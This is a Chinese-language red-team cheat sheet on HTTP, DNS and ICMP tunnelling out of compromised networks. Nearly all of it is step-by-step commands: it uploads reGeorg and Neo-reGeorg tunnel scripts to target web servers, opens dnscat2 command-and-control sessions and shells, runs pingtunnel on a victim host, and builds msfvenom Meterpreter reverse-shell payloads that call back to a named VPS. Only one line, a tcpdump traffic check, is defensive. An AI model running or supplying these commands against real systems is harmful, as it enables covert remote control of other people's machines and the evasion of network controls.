# HTTP_DNS_ICMP代理隧道

## HTTP代理

### reGeorg

reGeorg 支持 ASPX，ASHX，PHP，JSP 等WEB脚本，并特别提供了一个 tomcat5 版本。

用法

```bash
python2 reGeorgSocksProxy.py -p 8080 -u http://172.26.2.43:7001/bea_wls_internal/tunnel.t5.jsp
```

### Neo-reGeorg

1. 设置密码生成`tunnel.(aspx|ashx|jsp|jspx|php)`并上传到WEB服务器

   ```bash
   python3 neoreg.py generate -k passwd
   [+] Mkdir a directory: neoreg_servers
   [+] Create neoreg server files:
      => neoreg_servers/tunnel.ashx
      => neoreg_servers/tunnel.aspx
      => neoreg_servers/tunnel.jsp
      => neoreg_servers/tunnel.jspx
      => neoreg_servers/tunnel.php
   ```

2. 下载`tunnel`脚本到目标WEB服务(用python起http服务)

   ```bash
   wget http://192.168.1.105:8000/tunnel.jsp
   ```

3. 使用`neoreg.py`连接WEB服务器，在**本地**建立`socks`代理，代理默认端口`1080`

   ```bash
   python3 neoreg.py -k passwd -u http://218.76.8.99:38080/sh/tunnel.jsp
   ```

## DNS隧道

### Dnscat2

#### Dnscat2直连模式

1. 启动服务端

   ```bash
   ruby ./dnscat2.rb
   ```

2. 启动客户端

   ```bash
   ./dnscat --dns server=192.168.1.105,port=53 --secret=0f69f5a5e89a18b0c47fe12ec6f1896aW
   ```

3. 服务端接收到会话

   ```
   获取shell：
   windows
   session -i 1
   shell
   session -i 2
   ```

4. 直连模式流量特征

   ```
   tcpdump udp dst port 53
   ```

#### Dnscat2中继模式

> 准备
> 1. 一台公网C&C服务器
> 2. 一台内网靶机
> 3. 一个可配置解析的域名
>
> 
>
> 配置DNS域名解析：
> 1. 创建A记录，将自己的域名解析服务器（ns.heetian.cn）指向云服务器（139.155.49.43）
> 2. 创建NS记录，将子域名 dnsch.hetian.cn 的DNS解析交给 ns.heetian.cn

1. 启动服务端

   ```
   ruby ./dnscat2.rb dnsch.heetian.cn --secret=xxx
   ```

2. 启动客户端

   ```
   ./dnscat --secret=mingy dnsch.heetian.cn
   ```

3. 服务端接收会话

## ICMP 隧道

### Pingtunnel

> 目的：上线仅icmp协议出网的内网主机

### ICMP隧道转发TCP上线MSF

1. VPS启动ICMP隧道服务端

   > 139.155.49.43，icmp服务端和msf服务都在此VPS上

   ```
   ./pingtunnel -type server
   ```

2. 靶机启动ICMP隧道客户端

   ```
   pingtunnel.exe -type client -l 127.0.0.1:9999 -s 139.155.49.43 -t 139.155.49.43:7777 -tcp 1 -noprint 1 -nolog 1
   ```

   > icmp 客户端监听 127.0.0.1:9999 ，通过连接到 139.155.49.43 的 icmp 隧道，将127.0.0.1:9999 收到的 tcp 数据包转发到 139.155.49.43:7777

3. MSF 生成反弹 shell 的 payload 上传到靶机

   ```
   msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=127.0.0.1 lport=9999 -f exe > 9999.exe
   ```

4. 执行 payload 反弹 shell 到 MSF

### ICMP隧道转发Socks上线MSF

1. VPS启动ICMP隧道服务端

   > 139.155.49.43，icmp服务端和msf服务都在此VPS上

   ```
   ./pingtunnel -type server
   ```

2. 靶机启动ICMP隧道客户端

   ```
   pingtunnel.exe -type client -l 127.0.0.1:9999 -s 139.155.49.43 -sock5 1 -noprint 1 -nolog 1
   ```

   > icmp隧道客户端监听127.0.0.1:9999启动socks5服务，通过连接到139.155.49.43的
   > icmp隧道，由icmpserver转发socks5代理请求到目的地址 139.155.49.43:8899

3. MSF生成反弹shell的payload

   生成支持socks5代理的反向payload

   ```
   msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.106 lport=8899 HttpProxyType=SOCKS HttpProxyHost=127.0.0.1 HttpProxyPort=9999 -f exe > 1.exe
   ```

4. 执行payload反弹shell到MSF